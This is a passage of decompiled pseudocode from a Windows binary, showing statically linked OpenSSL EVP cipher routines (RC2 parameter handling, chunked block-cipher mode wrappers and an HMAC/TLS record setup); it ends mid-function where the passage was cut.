void *sub_45DCC0()
{
  return &unk_518AD0;
}

//----- (0045DCD0) --------------------------------------------------------
void *sub_45DCD0()
{
  return &unk_518B04;
}

//----- (0045DCE0) --------------------------------------------------------
int __cdecl sub_45DCE0(int a1, int a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-Ch]

  v4 = sub_407470(a1);
  v2 = sub_4073F0(a1);
  sub_4B13C0(v2, v4, a2);
  return 1;
}

//----- (0045DD10) --------------------------------------------------------
int __cdecl sub_45DD10(int C, int a2, int *a3, unsigned int a4)
{
  int v5; // ebp
  int v7; // eax
  int v8; // eax
  int *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = (int *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B2FC0(a3, a2, 0x40000000, v7, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x10000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = (int *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B2FC0(a3, a2, v5, v8, v11, v13);
  }
  return 1;
}

//----- (0045DDC0) --------------------------------------------------------
int __cdecl sub_45DDC0(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  int v7; // eax
  int v9; // [esp-14h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-14h]

  v4 = a4;
  v5 = 0x40000000;
  if ( a4 < 0x40000000 )
    v5 = a4;
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      a4 = sub_407450(C);
      v10 = sub_432B60(C);
      v9 = _tolower(C);
      v7 = sub_4073F0(C);
      sub_4B3200(a3, a2, v4, v7, v9, (int *)&a4, v10);
      sub_407460(C, a4);
      a2 += v5;
      v4 -= v5;
      a3 += v5;
      if ( v4 < v5 )
        v5 = v4;
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045DE50) --------------------------------------------------------
int __cdecl sub_45DE50(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // edi
  int v5; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v9; // [esp-10h] [ebp-14h]
  unsigned int v10; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v10 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v9 = sub_432B60(a1);
      v7 = sub_4073F0(a1);
      sub_4B3400(v5, (_BYTE *)(v5 + a2 - a3), v7, v9);
      v6 += v4;
      v5 += v4;
    }
    while ( v6 <= v10 );
  }
  return 1;
}

//----- (0045DEC0) --------------------------------------------------------
int __cdecl sub_45DEC0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  int v7; // eax
  int v8; // eax
  unsigned __int8 *v10; // [esp-8h] [ebp-1Ch]
  unsigned __int8 *v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = (unsigned __int8 *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B34D0(a3, a2, 0x40000000, v7, v10, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = (unsigned __int8 *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B34D0(a3, a2, v5, v8, v11, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045DFA0) --------------------------------------------------------
void *sub_45DFA0()
{
  return &unk_518B38;
}

//----- (0045DFB0) --------------------------------------------------------
void *sub_45DFB0()
{
  return &unk_518B6C;
}

//----- (0045DFC0) --------------------------------------------------------
void *sub_45DFC0()
{
  return &unk_518BA0;
}

//----- (0045DFD0) --------------------------------------------------------
void *sub_45DFD0()
{
  return &unk_518BD4;
}

//----- (0045DFE0) --------------------------------------------------------
int __cdecl sub_45DFE0(int a1, unsigned __int8 *a2)
{
  char *v2; // eax
  int v4; // [esp-8h] [ebp-Ch]

  v4 = sub_407470(a1);
  v2 = (char *)sub_4073F0(a1);
  sub_4B36C0(v2, v4, a2);
  return 1;
}

//----- (0045E010) --------------------------------------------------------
int __cdecl sub_45E010(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  int v7; // eax
  int v8; // eax
  unsigned __int16 *v10; // [esp-8h] [ebp-18h]
  unsigned __int16 *v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = (unsigned __int16 *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B3AD0(a3, a2, 0x40000000u, v7 + 4, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = (unsigned __int16 *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B3AD0(a3, a2, v5, v8 + 4, v11, v13);
  }
  return 1;
}

//----- (0045E0C0) --------------------------------------------------------
int __cdecl sub_45E0C0(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  unsigned int v5; // esi
  int v7; // eax
  unsigned __int16 *v9; // [esp-14h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-14h]

  v4 = a4;
  v5 = 0x40000000;
  if ( a4 < 0x40000000 )
    v5 = a4;
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      a4 = sub_407450(C);
      v10 = sub_432B60(C);
      v9 = (unsigned __int16 *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B3FB0(a3, a2, v4, v7 + 4, v9, (int *)&a4, v10);
      sub_407460(C, a4);
      a2 += v5;
      v4 -= v5;
      a3 += v5;
      if ( v4 < v5 )
        v5 = v4;
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045E150) --------------------------------------------------------
int __cdecl sub_45E150(int a1, int a2, unsigned __int16 *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned __int16 *v5; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v9; // [esp-Ch] [ebp-18h]
  unsigned int v10; // [esp+1Ch] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v10 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v9 = sub_432B60(a1);
      v7 = sub_4073F0(a1);
      sub_4B41A0(v5, (unsigned __int16 *)((char *)v5 + a2 - (_DWORD)a3), v7 + 4, v9);
      v6 += v4;
      v5 = (unsigned __int16 *)((char *)v5 + v4);
    }
    while ( v6 <= v10 );
  }
  return 1;
}

//----- (0045E1D0) --------------------------------------------------------
int __cdecl sub_45E1D0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  int v7; // eax
  int v8; // eax
  unsigned __int16 *v10; // [esp-8h] [ebp-1Ch]
  unsigned __int16 *v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = (unsigned __int16 *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B4270(a3, a2, 0x40000000, v7 + 4, v10, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = (unsigned __int16 *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B4270(a3, a2, v5, v8 + 4, v11, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045E2B0) --------------------------------------------------------
void *sub_45E2B0()
{
  return &unk_518C08;
}

//----- (0045E2C0) --------------------------------------------------------
void *sub_45E2C0()
{
  return &unk_518C3C;
}

//----- (0045E2D0) --------------------------------------------------------
void *sub_45E2D0()
{
  return &unk_518C70;
}

//----- (0045E2E0) --------------------------------------------------------
void *sub_45E2E0()
{
  return &unk_518CA4;
}

//----- (0045E2F0) --------------------------------------------------------
void *sub_45E2F0()
{
  return &unk_518CD8;
}

//----- (0045E300) --------------------------------------------------------
void *sub_45E300()
{
  return &unk_518D0C;
}

//----- (0045E310) --------------------------------------------------------
int __cdecl sub_45E310(int a1, int a2)
{
  int v2; // eax
  int v4; // [esp-Ch] [ebp-10h]
  int v5; // [esp-4h] [ebp-8h]

  v5 = *(_DWORD *)sub_4073F0(a1);
  v4 = sub_407470(a1);
  v2 = sub_4073F0(a1);
  sub_4B4460((_BYTE *)(v2 + 4), v4, a2, v5);
  return 1;
}

//----- (0045E350) --------------------------------------------------------
int __thiscall sub_45E350(void *this)
{
  int v2; // [esp+0h] [ebp-4h] BYREF

  sub_406090((int)this, 2, 0, (int)&v2);
  if ( v2 == 128 )
    return 58;
  if ( v2 == 64 )
    return 120;
  return v2 != 40 ? 0 : 0xA0;
}

//----- (0045E3A0) --------------------------------------------------------
int __cdecl sub_45E3A0(int a1)
{
  switch ( a1 )
  {
    case 58:
      return 128;
    case 120:
      return 64;
    case 160:
      return 40;
  }
  sub_408310(6, 109, 108, (int)"crypto\\evp\\e_rc2.c", 115);
  return 0;
}

//----- (0045E3E0) --------------------------------------------------------
int __cdecl sub_45E3E0(int **a1, int *a2)
{
  int v2; // edi
  unsigned int v3; // eax
  unsigned int v4; // ebx
  int v6; // ebx
  int v7; // [esp+10h] [ebp-18h] BYREF
  char Src[16]; // [esp+14h] [ebp-14h] BYREF

  v2 = 0;
  v7 = 0;
  if ( !a2 )
    return v2;
  v3 = sub_407410((int)a1);
  v4 = v3;
  if ( v3 > 0x10 )
    sub_417C70("assertion failed: l <= sizeof(iv)", "crypto\\evp\\e_rc2.c", 130);
  if ( (v2 = sub_422580(a2, &v7, Src, v3), v2 == v4)
    && (v6 = sub_45E3A0(v7)) != 0
    && (v2 <= 0 || sub_406270(a1, 0, 0, 0, Src, -1))
    && (sub_406090((int)a1, 3, v6, 0), sub_406600(a1, v6 / 8) > 0) )
  {
    return v2;
  }
  else
  {
    return -1;
  }
}

//----- (0045E4D0) --------------------------------------------------------
BOOL __cdecl sub_45E4D0(void *a1, int a2)
{
  BOOL result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // [esp-Ch] [ebp-10h]

  result = 0;
  if ( a2 )
  {
    v3 = sub_45E350(a1);
    v5 = sub_407410((int)a1);
    v4 = sub_407420((int)a1);
    return sub_422520(a2, v3, v4, v5);
  }
  return result;
}

//----- (0045E510) --------------------------------------------------------
int __cdecl sub_45E510(int a1, int a2, int a3, _DWORD *a4)
{
  int v5; // esi

  if ( a2 )
  {
    if ( a2 == 2 )
    {
      *a4 = *(_DWORD *)sub_4073F0(a1);
      return 1;
    }
    else if ( a2 == 3 )
    {
      if ( a3 <= 0 )
      {
        return 0;
      }
      else
      {
        *(_DWORD *)sub_4073F0(a1) = a3;
        return 1;
      }
    }
    else
    {
      return -1;
    }
  }
  else
  {
    v5 = 8 * sub_407470(a1);
    *(_DWORD *)sub_4073F0(a1) = v5;
    return 1;
  }
}

//----- (0045E590) --------------------------------------------------------
int __cdecl sub_45E590(int C, char *a2, char *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  int v7; // eax
  int v8; // eax
  char *v10; // [esp-8h] [ebp-18h]
  char *v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = (char *)_tolower(C);
      v7 = sub_4073F0(C);
      sub_4B4560(a3, a2, 0x40000000u, v7, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = (char *)_tolower(C);
    v8 = sub_4073F0(C);
    sub_4B4560(a3, a2, v5, v8, v11, v13);
  }
  return 1;
}

//----- (0045E640) --------------------------------------------------------
int __cdecl sub_45E640(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  int v7; // eax
  int v9; // [esp-14h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-14h]

  v4 = a4;
  v5 = 0x40000000;
  if ( a4 < 0x40000000 )
    v5 = a4;
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      a4 = sub_407450(C);
      v10 = sub_432B60(C);
      v9 = _tolower(C);
      v7 = sub_4073F0(C);
      sub_4B4590(a3, a2, v4, v7, v9, &a4, v10);
      sub_407460(C, a4);
      a2 += v5;
      v4 -= v5;
      a3 += v5;
      if ( v4 < v5 )
        v5 = v4;
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045E6D0) --------------------------------------------------------
int __cdecl sub_45E6D0(int a1, int a2, unsigned __int8 *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned __int8 *v5; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v9; // [esp-10h] [ebp-14h]
  unsigned int v10; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v10 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v9 = sub_432B60(a1);
      v7 = sub_4073F0(a1);
      sub_4B45D0(v5, &v5[a2 - (_DWORD)a3], v7, v9);
      v6 += v4;
      v5 += v4;
    }
    while ( v6 <= v10 );
  }
  return 1;
}

//----- (0045E740) --------------------------------------------------------
int __cdecl sub_45E740(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  int v7; // eax
  int v8; // eax
  int v10; // [esp-8h] [ebp-1Ch]
  int v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = _tolower(C);
      v7 = sub_4073F0(C);
      sub_4B4600(a3, a2, 0x40000000u, v7, v10, &a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = _tolower(C);
    v8 = sub_4073F0(C);
    sub_4B4600(a3, a2, v5, v8, v11, &a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045E820) --------------------------------------------------------
void *sub_45E820()
{
  return &unk_518D78;
}

//----- (0045E830) --------------------------------------------------------
void *sub_45E830()
{
  return &unk_518DAC;
}

//----- (0045E840) --------------------------------------------------------
void *sub_45E840()
{
  return &unk_518DE0;
}

//----- (0045E850) --------------------------------------------------------
void *sub_45E850()
{
  return &unk_518E14;
}

//----- (0045E860) --------------------------------------------------------
int __cdecl sub_45E860(int a1, unsigned __int8 *a2)
{
  int *v2; // eax

  v2 = (int *)sub_4073F0(a1);
  sub_4B4630(a2, v2);
  return 1;
}

//----- (0045E880) --------------------------------------------------------
int __cdecl sub_45E880(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int v4; // edi
  int v5; // esi
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  unsigned int v9; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v9 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v7 = (_DWORD *)sub_4073F0(a1);
      sub_4B6C80(v5, (_BYTE *)(v5 + a2 - a3), v7);
      v6 += v4;
      v5 += v4;
    }
    while ( v6 <= v9 );
  }
  return 1;
}

//----- (0045E8E0) --------------------------------------------------------
int __cdecl sub_45E8E0(int C, _BYTE *a2, unsigned __int8 *a3, unsigned int a4)
{
  unsigned int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-8h] [ebp-18h]
  int v12; // [esp-4h] [ebp-14h]
  int v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+20h] [ebp+10h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v14 = a4 >> 30;
    do
    {
      v12 = sub_432B60(C);
      v10 = _tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4B7590(a3, a2, 0x40000000u, v7, v10, v12);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v14;
    }
    while ( v14 );
  }
  if ( v5 )
  {
    v13 = sub_432B60(C);
    v11 = _tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4B7590(a3, a2, v5, v8, v11, v13);
  }
  return 1;
}

//----- (0045E990) --------------------------------------------------------
int __cdecl sub_45E990(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned __int8 *v10; // [esp-8h] [ebp-1Ch]
  unsigned __int8 *v11; // [esp-8h] [ebp-1Ch]
  unsigned int v12; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v12 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v10 = (unsigned __int8 *)_tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4B7A80(a3, a2, 0x40000000, v7, v10, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v12;
    }
    while ( v12 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v11 = (unsigned __int8 *)_tolower(C);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4B7A80(a3, a2, v5, v8, v11, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045EA70) --------------------------------------------------------
int __cdecl sub_45EA70(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  unsigned int v4; // edi
  unsigned int v5; // esi
  _DWORD *v7; // eax
  int v9; // [esp-14h] [ebp-1Ch]
  int v10; // [esp-Ch] [ebp-14h]

  v4 = a4;
  v5 = 0x40000000;
  if ( a4 < 0x40000000 )
    v5 = a4;
  if ( a4 )
  {
    do
    {
      if ( v4 < v5 )
        break;
      a4 = sub_407450(C);
      v10 = sub_432B60(C);
      v9 = _tolower(C);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4B7C70(a3, a2, v4, v7, v9, (int *)&a4, v10);
      sub_407460(C, a4);
      a2 += v5;
      v4 -= v5;
      a3 += v5;
      if ( v4 < v5 )
        v5 = v4;
    }
    while ( v4 );
  }
  return 1;
}

//----- (0045EB00) --------------------------------------------------------
void *sub_45EB00()
{
  return &unk_518E48;
}

//----- (0045EB10) --------------------------------------------------------
void *sub_45EB10()
{
  return &unk_518E7C;
}

//----- (0045EB20) --------------------------------------------------------
void *sub_45EB20()
{
  return &unk_518EB0;
}

//----- (0045EB30) --------------------------------------------------------
void *sub_45EB30()
{
  return &unk_518EE4;
}

//----- (0045EB40) --------------------------------------------------------
int __cdecl sub_45EB40(int a1, unsigned __int8 *a2, int a3, int a4)
{
  FILE *v4; // eax
  FILE *v5; // eax
  _DWORD *v6; // eax
  int *v8; // eax
  _DWORD v9[54]; // [esp+4h] [ebp-D8h] BYREF

  if ( a4
    || (v4 = (FILE *)sub_435D30(a1), (_fileno(v4) & 0xF0007) == 4)
    || (v5 = (FILE *)sub_435D30(a1), (_fileno(v5) & 0xF0007) == 3) )
  {
    v6 = (_DWORD *)sub_4073F0(a1);
    sub_4B7E70(a2, v6);
    return 1;
  }
  else
  {
    sub_4B7E70(a2, v9);
    v8 = (int *)sub_4073F0(a1);
    sub_4B8040((int)v9, v8);
    sub_4139E0(v9, 0xD8u);
    return 1;
  }
}
// 45EB40: using guessed type _DWORD var_D8[54];

//----- (0045EC00) --------------------------------------------------------
int __cdecl sub_45EC00(int a1, int a2)
{
  _DWORD *v2; // ebx
  int v3; // eax

  v2 = (_DWORD *)sub_4073F0(a1);
  v3 = sub_407470(a1);
  sub_460A60(v2, v3, a2);
  sub_424220(v2 + 258);
  qmemcpy(v2 + 281, v2 + 258, 0x5Cu);
  qmemcpy(v2 + 304, v2 + 258, 0x5Cu);
  v2[327] = -1;
  return 1;
}

//----- (0045EC70) --------------------------------------------------------
int __cdecl sub_45EC70(int a1, __m64 *a2, __m64 *a3, size_t Size)
{
  int *v4; // ebp
  size_t v5; // ebx
  char *v6; // ebx
  char v8[16]; // [esp+18h] [ebp-14h] BYREF

  v4 = (int *)sub_4073F0(a1);
  v5 = v4[327];
  if ( v5 != -1 && Size != v5 + 16 )
    return 0;
  if ( sub_432B60(a1) )
  {
    if ( v5 == -1 )
      v5 = Size;
    sub_424010(v4 + 304, (char *)a3, v5);
    if ( v5 == Size )
    {
      sub_460740((int)v4, Size, a3, (int)a2);
    }
    else
    {
      if ( a3 != a2 )
        memcpy(a2, a3, v5);
      v6 = (char *)a2 + v5;
      sub_4240F0((int)v6, (int)(v4 + 304));
      qmemcpy(v4 + 304, v4 + 281, 0x5Cu);
      sub_424010(v4 + 304, v6, 0x10u);
      sub_4240F0((int)v6, (int)(v4 + 304));
      sub_460740((int)v4, Size, a2, (int)a2);
    }
    goto LABEL_15;
  }
  sub_460740((int)v4, Size, a3, (int)a2);
  if ( v5 == -1 )
  {
    sub_424010(v4 + 304, (char *)a2, Size);
  }
  else
  {
    sub_424010(v4 + 304, (char *)a2, v5);
    sub_4240F0((int)v8, (int)(v4 + 304));
    qmemcpy(v4 + 304, v4 + 281, 0x5Cu);
    sub_424010(v4 + 304, v8, 0x10u);
    sub_4240F0((int)v8, (int)(v4 + 304));
    if ( sub_413A50((char *)a2 + v5, v8, 16) )
      return 0;
  }
LABEL_15:
  v4[327] = -1;
  return 1;
}

//----- (0045EE30) --------------------------------------------------------
int __cdecl sub_45EE30(int a1, int a2, int Size, unsigned __int8 *Src)
{
  int *v4; // edi
  unsigned int i; // eax
  unsigned int j; // eax
  int v8; // ebx
  char v9[64]; // [esp+10h] [ebp-44h] BYREF

  v4 = (int *)sub_4073F0(a1);
  if ( a2 != 22 )
  {
    if ( a2 == 23 )
    {
      memset(v9, 0, sizeof(v9));
      if ( Size <= 64 )
      {
        memcpy(v9, Src, Size);
      }
      else
      {
        sub_424220(v4 + 258);
        sub_424010(v4 + 258, (char *)Src, Size);
        sub_4240F0((int)v9, (int)(v4 + 258));
      }
      for ( i = 0; i < 0x40; ++i )
        v9[i] ^= 0x36u;
      sub_424220(v4 + 258);
      sub_424010(v4 + 258, v9, 0x40u);
      for ( j = 0; j < 0x40; ++j )
        v9[j] ^= 0x6Au;
      sub_424220(v4 + 281);
      sub_424010(v4 + 281, v9, 0x40u);
      sub_4139E0(v9, 0x40u);
      return 1;
    }
    return -1;
  }
  if ( Size != 13 )
    return -1;
  v8 = Src[12] | (Src[11] << 8);
  if ( !sub_432B60(a1) )
  {
    v8 -= 16;
    Src[11] = BYTE1(v8);
    Src[12] = v8;
  }
  v4[327] = v8;
  qmemcpy(v4 + 304, v4 + 258, 0x5Cu);
  sub_424010(v4 + 304, (char *)Src, 0xDu);
  return 16;
}
// 45EE30: using guessed type char var_44[64];

//----- (0045EFC0) --------------------------------------------------------
void *sub_45EFC0()
{
  return &unk_535394;
}

//----- (0045EFD0) --------------------------------------------------------
void *sub_45EFD0()
{
  return &unk_518F18;
}

//----- (0045EFE0) --------------------------------------------------------
void *sub_45EFE0()
{
  return &unk_518F4C;
}

//----- (0045EFF0) --------------------------------------------------------
int __cdecl sub_45EFF0(int a1, int a2)
{
  _DWORD *v2; // eax
  int v4; // [esp-8h] [ebp-Ch]

  v4 = sub_407470(a1);
  v2 = (_DWORD *)sub_4073F0(a1);
  sub_460A60(v2, v4, a2);
  return 1;
}

//----- (0045F020) --------------------------------------------------------
int __cdecl sub_45F020(int a1, int a2, __m64 *a3, int a4)
{
  int v4; // eax

  v4 = sub_4073F0(a1);
  sub_460740(v4, a4, a3, a2);
  return 1;
}

//----- (0045F050) --------------------------------------------------------
int __cdecl sub_45F050(int a1, int a2, unsigned __int16 *a3, unsigned int a4)
{
  unsigned int v4; // ebx
  unsigned __int16 *v5; // edi
  unsigned int v6; // ebp
  _DWORD *v7; // eax
  _DWORD *v9; // [esp-14h] [ebp-20h]
  _DWORD *v10; // [esp-10h] [ebp-1Ch]
  int v11; // [esp-Ch] [ebp-18h]
  unsigned int v12; // [esp+1Ch] [ebp+10h]

  v4 = *(_DWORD *)(sub_435D30(a1) + 4);
  if ( a4 >= v4 )
  {
    v12 = a4 - v4;
    v5 = a3;
    v6 = 0;
    do
    {
      v11 = sub_432B60(a1);
      v10 = (_DWORD *)(sub_4073F0(a1) + 256);
      v9 = (_DWORD *)(sub_4073F0(a1) + 128);
      v7 = (_DWORD *)sub_4073F0(a1);
      sub_4B80E0(v5, (unsigned __int16 *)((char *)v5 + a2 - (_DWORD)a3), v7, v9, v10, v11);
      v6 += v4;
      v5 = (unsigned __int16 *)((char *)v5 + v4);
    }
    while ( v6 <= v12 );
  }
  return 1;
}

//----- (0045F0E0) --------------------------------------------------------
int __cdecl sub_45F0E0(int C, _BYTE *a2, _BYTE *a3, unsigned int a4)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v10; // [esp-10h] [ebp-24h]
  _DWORD *v11; // [esp-10h] [ebp-24h]
  _DWORD *v12; // [esp-Ch] [ebp-20h]
  _DWORD *v13; // [esp-Ch] [ebp-20h]
  unsigned __int8 *v14; // [esp-8h] [ebp-1Ch]
  unsigned __int8 *v15; // [esp-8h] [ebp-1Ch]
  unsigned int v16; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v16 = a4 >> 30;
    do
    {
      a4 = sub_407450(C);
      v14 = (unsigned __int8 *)_tolower(C);
      v12 = (_DWORD *)(sub_4073F0(C) + 256);
      v10 = (_DWORD *)(sub_4073F0(C) + 128);
      v7 = (_DWORD *)sub_4073F0(C);
      sub_4B81C0(a3, a2, 0x40000000, v7, v10, v12, v14, (int *)&a4);
      sub_407460(C, a4);
      v5 -= 0x40000000;
      a3 += 0x40000000;
      a2 += 0x40000000;
      --v16;
    }
    while ( v16 );
  }
  if ( v5 )
  {
    a4 = sub_407450(C);
    v15 = (unsigned __int8 *)_tolower(C);
    v13 = (_DWORD *)(sub_4073F0(C) + 256);
    v11 = (_DWORD *)(sub_4073F0(C) + 128);
    v8 = (_DWORD *)sub_4073F0(C);
    sub_4B81C0(a3, a2, v5, v8, v11, v13, v15, (int *)&a4);
    sub_407460(C, a4);
  }
  return 1;
}

//----- (0045F1F0) --------------------------------------------------------
int __cdecl sub_45F1F0(int C, int a2, int *a3, unsigned int a4)
{
  int v4; // esi
  int v5; // eax
  unsigned int v7; // eax
  int *v8; // ebx
  int v9; // ebp
  int *v10; // eax
  int *v11; // eax
  int v12; // [esp-Ch] [ebp-18h]
  int v13; // [esp-Ch] [ebp-18h]
  unsigned int v14; // [esp+8h] [ebp-4h]

  v4 = sub_4073F0(C);
  if ( *(_DWORD *)(v4 + 384) )
  {
    v5 = _tolower(C);
    (*(void (__cdecl **)(int *, int, unsigned int, int, int))(v4 + 384))(a3, a2, a4, v4, v5);
    return 1;
  }
  else
  {
    v7 = a4;
    v8 = a3;
    v9 = a2;
    if ( a4 >= 0x40000000 )
    {
      v14 = a4 >> 30;
      do
      {
        v12 = sub_432B60(C);
        v10 = (int *)_tolower(C);
        sub_4B9800(v8, v9, 0x40000000, (_DWORD *)v4, (_DWORD *)(v4 + 128), (_DWORD *)(v4 + 256), v10, v12);
        a4 -= 0x40000000;
        v8 += 0x10000000;
        v9 += 0x40000000;
        --v14;
      }
      while ( v14 );
      v7 = a4;
    }
    if ( v7 )
    {
      v13 = sub_432B60(C);
      v11 = (int *)_tolower(C);
      sub_4B9800(v8, v9, a4, (_DWORD *)v4, (_DWORD *)(v4 + 128), (_DWORD *)(v4 + 256), v11, v13);
    }
    return 1;
  }
}

//----- (0045F300) --------------------------------------------------------
int __cdecl sub_45F300(int C, _BYTE *a2, char *a3, unsigned int a4)
{
  int v5; // ebp
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  _DWORD *v10; // [esp-14h] [ebp-28h]
  _DWORD *v11; // [esp-14h] [ebp-28h]
  _DWORD *v12; // [esp-10h] [ebp-24h]
  _DWORD *v13; // [esp-10h] [ebp-24h]
  unsigned __int16 *v14; // [esp-Ch] [ebp-20h]
  unsigned __int16 *v15; // [esp-Ch] [ebp-20h]
  int v16; // [esp-4h] [ebp-18h]
  int v17; // [esp-4h] [ebp-18h]
  unsigned int v18; // [esp+10h] [ebp-4h]

  v5 = a4;
  if ( a4 >= 0x40000000 )
  {
    v18 = a4 >> 30;
    do
    {
